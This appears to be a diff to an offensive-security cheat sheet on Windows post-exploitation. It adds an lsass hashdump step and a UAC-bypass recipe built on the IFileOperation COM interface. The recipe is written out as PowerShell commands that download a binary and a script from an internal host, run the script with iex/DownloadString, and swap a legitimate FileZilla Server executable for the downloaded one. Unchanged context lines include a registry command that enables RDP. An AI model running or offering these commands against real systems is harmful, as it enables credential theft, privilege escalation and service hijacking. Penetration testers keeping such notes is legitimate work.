@@ -252,11 +252,22 @@
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
     ```
 - [Windows file association](https://stackoverflow.com/questions/23074430/how-to-run-vbscript-from-command-line-without-cscript-wscript)
-
+- Hashes
+    - `ps -S lsass.exe` -> `hashdump`
 ### Bypasses
 
 - ftp.exe to open processes: <https://twitter.com/yeyint_mth/status/1009732492138442752>
-
+- If the user is a member of the Administrators group then, we can invoke IFileOperation methods to copy, move, rename, create, and delete files without any additional permissions. This is a well-known technique used by malware.
+  - <https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ifileoperation>
+  - While using the IFileOperation by default it doesn’t ask for the UAC Popup
+    - `iwr -UseBasicParsing -Uri ​'http://10.10.1.2/FileZilla Server.exe'​ -OutFile 'C:\Users\sysadmin\AppData\Local\Temp\FileZilla Server.exe'`
+    - `iex (New-Object Net.WebClient).DownloadString('http://​10.10.1.2​/Invoke-IFileOperation.ps1')`
+    - `Invoke-IFileOperation`
+    - `$IFileOperation | Get-Member`
+    - `$IFileOperation.RenameItem("C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe", "Original.exe")`
+    - `$IFileOperation.PerformOperations()`
+    - `$IFileOperation.MoveItem("​C:\Users\sysadmin\AppData\Local\Temp\FileZilla Server.exe​", "​C:\Program Files (x86)\FileZilla Server\", "FileZilla Server.exe​")`
+    - `$IFileOperation.PerformOperations()`
 ### Tools 
 
 - Patch Extractor : [https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd](https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd) [https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d](https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d)
